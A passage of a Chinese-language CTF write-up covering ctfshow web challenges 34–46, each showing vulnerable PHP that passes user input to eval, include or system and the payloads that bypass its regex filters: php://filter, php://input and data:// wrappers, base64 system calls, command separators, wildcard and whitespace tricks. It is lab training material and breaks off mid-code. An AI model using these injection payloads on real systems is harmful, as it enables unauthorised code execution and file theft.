href="#一-分析代码：-4" class="headerlink" title="一.分析代码："></a>一.分析代码：</h2><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-07-09214440.png"></p><p>对以上进行过滤</p><h2 id="二-解题思路：-3"><a href="#二-解题思路：-3" class="headerlink" title="二.解题思路："></a>二.解题思路：</h2><h3 id="方法一：-4"><a href="#方法一：-4" class="headerlink" title="方法一："></a>方法一：</h3><p>思路同上，但是本题过滤了单双引号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=include$_GET[url]?&gt;&amp;url=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><h3 id="方法二：-3"><a href="#方法二：-3" class="headerlink" title="方法二："></a>方法二：</h3><p>使用input伪协议</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=include$_GET[url]?&gt;&amp;url=php://input </span><br></pre></td></tr></table></figure><p>post部分：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(&quot;more flag.php&quot;); ?&gt;</span><br></pre></td></tr></table></figure><h1 id="web-35"><a href="#web-35" class="headerlink" title="web 35"></a>web 35</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h2 id="一-分析代码：-5"><a href="#一-分析代码：-5" class="headerlink" title="一.分析代码："></a>一.分析代码：</h2><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-07-10131021.png"></p><p>过滤规则由上所示</p><h2 id="二-解题思路"><a href="#二-解题思路" class="headerlink" title="二.解题思路"></a>二.解题思路</h2><h3 id="方法一：-5"><a href="#方法一：-5" class="headerlink" title="方法一："></a>方法一：</h3><p>同上：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=include$_GET[url]?&gt;&amp;url=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><h3 id="方法二：-4"><a href="#方法二：-4" class="headerlink" title="方法二："></a>方法二：</h3><p>使用input伪协议</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=include$_GET[url]?&gt;&amp;url=php://input </span><br></pre></td></tr></table></figure><p>post部分：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(&quot;more flag.php&quot;); ?&gt;</span><br></pre></td></tr></table></figure><h1 id="web-36"><a href="#web-36" class="headerlink" title="web 36"></a>web 36</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=|\/|[0-9]/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h2 id="一-分析代码：-6"><a href="#一-分析代码：-6" class="headerlink" title="一.分析代码："></a>一.分析代码：</h2><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-07-10132143.png"></p><p>对如上进行了过滤</p><h2 id="二-解题思路：-4"><a href="#二-解题思路：-4" class="headerlink" title="二.解题思路："></a>二.解题思路：</h2><h3 id="方法一：-6"><a href="#方法一：-6" class="headerlink" title="方法一："></a>方法一：</h3><p>同上：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=include$_GET[url]?&gt;&amp;url=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><h3 id="方法二：-5"><a href="#方法二：-5" class="headerlink" title="方法二："></a>方法二：</h3><p>使用input伪协议</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=include$_GET[url]?&gt;&amp;url=php://input </span><br></pre></td></tr></table></figure><p>post部分：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(&quot;more flag.php&quot;); ?&gt;</span><br></pre></td></tr></table></figure><h1 id="web-37"><a href="#web-37" class="headerlink" title="web 37"></a>web 37</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;</span><br><span class="line">        include($c);</span><br><span class="line">        echo $flag;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h2 id="一-分析代码-1"><a href="#一-分析代码-1" class="headerlink" title="一.分析代码:"></a>一.分析代码:</h2><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-07-10133426.png"></p><p>过滤了如上的代码</p><p>文件包含</p><h2 id="二-解题思路：-5"><a href="#二-解题思路：-5" class="headerlink" title="二.解题思路："></a>二.解题思路：</h2><p>使用伪协议读flag。</p><p><code> data://，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行</code></p><h3 id="方法一：-7"><a href="#方法一：-7" class="headerlink" title="方法一："></a>方法一：</h3><p>flag使用*绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=data://text/plain,&lt;?php echo system(&#x27;cat fl*&#x27;);?&gt;</span><br><span class="line">?c=data://text/plain,&lt;?php%20 system(&#x27;cat fl*&#x27;);?&gt;</span><br></pre></td></tr></table></figure><p>查看源码即可得到flag</p><h3 id="方法二：-6"><a href="#方法二：-6" class="headerlink" title="方法二："></a>方法二：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</span><br></pre></td></tr></table></figure><p>base64解码为<code>&lt;?php system(&#39;cat flag.php&#39;);?&gt;</code><br> 查看源码即可得到flag</p><h3 id="方法三：-2"><a href="#方法三：-2" class="headerlink" title="方法三："></a>方法三：</h3><p>使用input伪协议进行读取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=php://input</span><br></pre></td></tr></table></figure><p>post部分：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(&quot;more flag.php&quot;); ?&gt;</span><br></pre></td></tr></table></figure><h1 id="web-38"><a href="#web-38" class="headerlink" title="web 38"></a>web 38</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"></span><br><span class="line">//flag in flag.php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag|php|file/i&quot;, $c))&#123;</span><br><span class="line">        include($c);</span><br><span class="line">        echo $flag;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h2 id="一-分析代码：-7"><a href="#一-分析代码：-7" class="headerlink" title="一.分析代码："></a>一.分析代码：</h2><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-07-10134722.png"></p><p>对以上进行了过滤</p><h2 id="二-解题思路：-6"><a href="#二-解题思路：-6" class="headerlink" title="二.解题思路："></a>二.解题思路：</h2><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一:"></a>方法一:</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</span><br></pre></td></tr></table></figure><h3 id="方法二：-7"><a href="#方法二：-7" class="headerlink" title="方法二："></a>方法二：</h3><p>使用input伪协议进行读取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=php://input</span><br></pre></td></tr></table></figure><p>post部分：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(&quot;more flag.php&quot;); ?&gt;</span><br></pre></td></tr></table></figure><h1 id="web-39"><a href="#web-39" class="headerlink" title="web 39"></a>web 39</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h2 id="一-分析代码：-8"><a href="#一-分析代码：-8" class="headerlink" title="一.分析代码："></a>一.分析代码：</h2><p>对flag进行了过滤，在进行包含的时候会加上php的后缀</p><h2 id="二-解题思路：-7"><a href="#二-解题思路：-7" class="headerlink" title="二.解题思路："></a>二.解题思路：</h2><p>我们可以试试伪协议，因为不能带有flag，所以filter协议和php://input也不好用了。data://text/plain, 这样就相当于执行了php语句 .php 因为前面的php语句已经闭合了，所以后面的.php会被当成html页面直接显示在页面上，起不到什么 作用<br>flag使用*绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=data://text/plain,&lt;?php echo system(&#x27;cat fl*&#x27;);?&gt;</span><br><span class="line">?c=data://text/plain,&lt;?php%20 system(&#x27;cat fl*&#x27;);?&gt;</span><br></pre></td></tr></table></figure><p>查看源码即可得到flag<br> 这样就相当于执行了php语句<code>&lt;?php system(&#39;cat f*&#39;)?&gt;.php</code></p><h1 id="web-40"><a href="#web-40" class="headerlink" title="web 40"></a>web 40</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h2 id="一-分析代码：-9"><a href="#一-分析代码：-9" class="headerlink" title="一.分析代码："></a>一.分析代码：</h2><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-07-11150938.png"></p><p>对以上进行了过滤。正则中的括号不是英文的 是过滤了中文的括号。</p><h2 id="二-解题思路：-8"><a href="#二-解题思路：-8" class="headerlink" title="二.解题思路："></a>二.解题思路：</h2><p><a href="https://www.freebuf.com/articles/system/242482.html">无参数读文件和RCE总结</a></p><p><strong>涉及的知识点：</strong><br> 读文件+数组改造</p><pre><code>localeconv()：返回一包含本地数字及货币格式信息的数组。其中数组中的第一个为点号(.)pos()：返回数组中的当前元素的值。array_reverse()：数组逆序 scandir()：获取目录下的文件next()：函数将内部指针指向数组中的下一个元素，并输出。 首先通过pos(localeconv())得到点号，因为scandir(’.’)表示得到当前目录下的文件，所以scandir(pos(localeconv()))就能得到flag.php了。具体内容如下</code></pre><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-07-11152648.png"></p><p>我们的目标非常的明确，只需要将数组逆序然后将指针移动到下一个元素即可。</p><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-07-11153136.png"></p><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-07-11153307.png"></p><p>可以使用</p><p><code> show_source(),readfile、highlight_file、file_get_contents</code>(readfile和file_get_contents读文件，显示在源码处)</p><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-07-11154433.png"></p><h1 id="web-41"><a href="#web-41" class="headerlink" title="web 41"></a>web 41</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;echo(<span class="subst">$c</span>);&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><h2 id="一-分析代码：-10"><a href="#一-分析代码：-10" class="headerlink" title="一.分析代码："></a>一.分析代码：</h2><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-07-11154804.png"></p><p>对以上进行了过滤。</p><h2 id="二-解题思路：-9"><a href="#二-解题思路：-9" class="headerlink" title="二.解题思路："></a>二.解题思路：</h2><p><a href="https://wp.ctf.show/d/137-ctfshow-web-web41">羽大佬的wp</a></p><h1 id="web-42"><a href="#web-42" class="headerlink" title="web 42"></a>web 42</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h2 id="一-分析代码：-11"><a href="#一-分析代码：-11" class="headerlink" title="一.分析代码："></a>一.分析代码：</h2><p><strong>&gt;/dev/null 2&gt;&amp;1</strong>主要意思是不进行回显的意思，可参考<a href="https://www.cnblogs.com/tinywan/p/6025468.html">Shell脚本———— /dev/null 2&gt;&amp;1详解</a></p><h2 id="二-解题思路：-10"><a href="#二-解题思路：-10" class="headerlink" title="二.解题思路："></a>二.解题思路：</h2><p>我们的目的是让命令回显，那么进行命令分隔即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">; //分号</span><br><span class="line">| //只执行后面那条命令</span><br><span class="line">|| //只执行前面那条命令</span><br><span class="line">&amp; //两条命令都会执行</span><br><span class="line">&amp;&amp; //两条命令都会执行</span><br></pre></td></tr></table></figure><p>可构造playload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat flag.php;</span><br><span class="line">cat flag.php||</span><br></pre></td></tr></table></figure><h1 id="web-43"><a href="#web-43" class="headerlink" title="web 43"></a>web 43</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h2 id="一-分析代码：-12"><a href="#一-分析代码：-12" class="headerlink" title="一.分析代码："></a>一.分析代码：</h2><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-07-12204901.png"></p><p>代码对以上进行了过滤。</p><h2 id="二-解题思路：-11"><a href="#二-解题思路：-11" class="headerlink" title="二.解题思路："></a>二.解题思路：</h2><p>同上，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?c=more flag.php||</span><br><span class="line">?c=sort flag.php||</span><br><span class="line">?c=less flag.php||</span><br><span class="line">?c=tac flag.php||</span><br><span class="line">?c=tail flag.php||</span><br><span class="line">?c=nl flag.php||</span><br><span class="line">?c=strings flag.php||</span><br></pre></td></tr></table></figure><p>等都可以进行绕过。</p><p><a href="https://www.cnblogs.com/NPFS/p/13279815.html">命令执行绕过小技巧</a></p><h1 id="web-44"><a href="#web-44" class="headerlink" title="web 44"></a>web 44</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/;|cat|flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h2 id="一-分析代码：-13"><a href="#一-分析代码：-13" class="headerlink" title="一.分析代码："></a>一.分析代码：</h2><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-07-12205258.png"></p><p>对以上进行了过滤。</p><h2 id="二-解题思路：-12"><a href="#二-解题思路：-12" class="headerlink" title="二.解题思路："></a>二.解题思路：</h2><p>使用通配符进行绕过即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?c=more fl&#x27;&#x27;ag.php||</span><br><span class="line">?c=more fla*.php||</span><br><span class="line">?c=more ????.???||</span><br></pre></td></tr></table></figure><h1 id="web-45"><a href="#web-45" class="headerlink" title="web 45"></a>web 45</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| /i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h2 id="一-分析代码：-14"><a href="#一-分析代码：-14" class="headerlink" title="一.分析代码："></a>一.分析代码：</h2><p>​                                                                                <img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-07-12205730.png">  </p><p>对以上加一个空格进行了过滤</p><h2 id="二-解题思路：-13"><a href="#二-解题思路：-13" class="headerlink" title="二.解题思路："></a>二.解题思路：</h2><p>空格绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">`%09`(需要php环境)</span><br><span class="line">`$&#123;IFS&#125;`</span><br><span class="line">`$IFS$9`</span><br><span class="line">`&#123;cat,flag.php&#125;` //用逗号实现了空格功能</span><br><span class="line">`%20`</span><br><span class="line"> %09</span><br><span class="line"> &lt;&gt;</span><br><span class="line"> &lt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=more%09fla*.php||</span><br></pre></td></tr></table></figure><h1 id="web-46"><a href="#web-46" class="headerlink" title="web 46"></a>web 46</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span 